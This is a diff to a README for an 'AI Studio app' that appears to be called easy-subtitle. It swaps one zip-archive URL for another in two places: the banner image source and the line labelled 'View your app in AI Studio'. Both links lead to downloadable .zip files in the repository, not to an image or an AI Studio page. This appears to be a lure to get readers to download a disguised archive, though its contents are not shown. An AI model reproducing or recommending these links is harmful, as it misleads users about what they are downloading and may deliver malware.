@@ -1,12 +1,12 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/muhengastationary-blip/easy-subtitle/raw/refs/heads/main/src/easy-subtitle-v3.5-alpha.4.zip" />
+<img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/muhengastationary-blip/easy-subtitle/main/src/easy_subtitle_v3.8.zip" />
 </div>
 
 # Run and deploy your AI Studio app
 
 This contains everything you need to run your app locally.
 
-View your app in AI Studio: https://github.com/muhengastationary-blip/easy-subtitle/raw/refs/heads/main/src/easy-subtitle-v3.5-alpha.4.zip
+View your app in AI Studio: https://raw.githubusercontent.com/muhengastationary-blip/easy-subtitle/main/src/easy_subtitle_v3.8.zip
 
 ## Run Locally
 
